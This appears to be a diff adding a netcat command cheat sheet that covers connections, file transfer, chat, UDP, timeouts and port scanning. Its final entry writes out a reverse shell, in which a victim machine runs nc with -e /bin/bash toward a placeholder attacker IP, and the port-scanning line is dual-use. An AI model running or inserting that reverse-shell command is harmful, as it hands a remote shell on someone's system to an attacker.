@@ -1,0 +1,38 @@
+# nc
+# Versatile networking utility to read and write data across networks.
+
+# Basic client use - connect to a server
+nc [hostname] [port]
+
+# Basic server use - listen on a specific port
+nc -l -p [port]
+
+# Send a file from a client to a server
+# Server side
+nc -l -p [port] > [output-file]
+# Client side
+nc [hostname] [port] < [input-file]
+
+# Create a simple chat server
+# Server side
+nc -l -p [port]
+# Client side
+nc [hostname] [port]
+
+# Port scanning a host for open ports
+nc -zv [hostname] [starting-port]-[ending-port]
+
+# Using UDP instead of TCP
+nc -u [hostname] [port]
+
+# Use with a timeout setting
+nc -w [timeout-in-seconds] [hostname] [port]
+
+# Listen for connections on multiple interfaces
+nc -l -p [port] -k
+
+# Establish a reverse shell (use with caution)
+# Attacker machine - listen for incoming connections
+nc -l -p [port]
+# Victim machine - connect to attacker
+nc [attacker-ip] [port] -e /bin/bash
